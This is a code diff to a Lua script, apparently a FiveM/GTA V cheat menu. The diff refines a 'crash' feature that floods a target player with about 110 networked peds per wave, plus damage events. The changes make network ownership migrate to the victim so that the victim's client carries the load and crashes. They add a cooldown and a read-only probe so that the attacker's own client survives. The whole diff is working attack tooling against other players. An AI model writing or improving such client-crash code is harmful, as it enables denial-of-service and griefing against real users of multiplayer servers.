@@ -19962,6 +19962,7 @@ C.targets = {}
 C.index = 1
 C.targetKind = nil
 C.running = false
+C.cooldownUntil = 0
 C.kind = nil
 C.created = {}
 C.ambient = {}
@@ -20139,6 +20140,12 @@ end
 
 local function deleteCreated(ped)
     if type(ped) ~= "number" or ped == 0 or not DoesEntityExist(ped) then return end
+    -- Ownership is allowed to migrate to the closest client (the target), so
+    -- the flood is simulated there and not on the operator. Deleting still
+    -- needs a short control request first.
+    if type(NetworkRequestControlOfEntity) == "function" then
+        pcall(NetworkRequestControlOfEntity, ped)
+    end
     pcall(SetEntityAsNoLongerNeeded, ped)
     pcall(DeleteEntity, ped)
 end
@@ -20147,8 +20154,11 @@ local function baseNetworkPed(ped)
     local okNet, netId = pcall(NetworkGetNetworkIdFromEntity, ped)
     if okNet and type(netId) == "number" and netId > 0 then
         pcall(SetNetworkIdExistsOnAllMachines, netId, true)
+        -- Migration stays enabled: the closest client (the target) takes the
+        -- simulation. Keeping ownership here made the operator carry the whole
+        -- swarm and crash first.
         if type(SetNetworkIdCanMigrate) == "function" then
-            pcall(SetNetworkIdCanMigrate, netId, false)
+            pcall(SetNetworkIdCanMigrate, netId, true)
         end
     end
 end
@@ -20551,6 +20561,15 @@ function C.launch(kind)
         return false
     end
 
+    -- Anti-spam: a second flood inside the cooldown would stack a new 110-ped
+    -- wave while the previous one is still being streamed to the operator.
+    -- One flood at a time, then a pause long enough for the local entity
+    -- manager to release the previous wave.
+    if now() < (C.cooldownUntil or 0) then
+        O.log("crash: cooling down")
+        return false
+    end
+
     kind = kind or "ped"
     if not WINDOWS[kind] then
         O.log("crash: unknown method %s", tostring(kind))
@@ -20581,6 +20600,7 @@ function C.launch(kind)
         end
         C.running = false
         C.cleanup()
+        C.cooldownUntil = now() + 6000
         O.log("crash: done %d created, %d scenarios, %d emotes, %d waves, %d fails",
             C.stats.created, C.stats.scenarios, C.stats.emotes, C.stats.waves, C.stats.fails)
     end)
@@ -21910,7 +21930,13 @@ local NET = (function(O, C)
 
     function NET.crash()
         NET.watch(45)
-        local mutating = NET.mutate(10)
+
+        -- Read-only probe: it learns which (array, elem) pairs this client
+        -- actually owns by watching the engine's own outgoing updates. The
+        -- outbound buffer is never modified: a mutated buffer can be applied
+        -- to the sender's own array and crash the operator first.
+        local probing = NET.probe(10)
+
         local variants = {
             { 0.0, 522 },
             { 0.0, 525312 },
@@ -21918,15 +21944,23 @@ local NET = (function(O, C)
             { 1.0, 525312 },
         }
         Citizen.CreateThread(function()
-            if mutating then Citizen.Wait(10600) end
-            NET.start(7, true)
+            if probing then Citizen.Wait(10600) end
+            local hasPairs = false
+            if type(NET.seen) == "table" then
+                for _ in pairs(NET.seen) do hasPairs = true break end
+            end
+            if hasPairs then
+                NET.start(7, true)
+            else
+                O.log("net crash: no owned pair seen, damage only")
+            end
             for i = 1, 16 do
                 if i > 1 then Citizen.Wait(1100) end
                 local v = variants[(i - 1) % #variants + 1]
                 NET.damage(v[1], v[2])
             end
         end)
-        return mutating
+        return probing
     end
 
     return NET
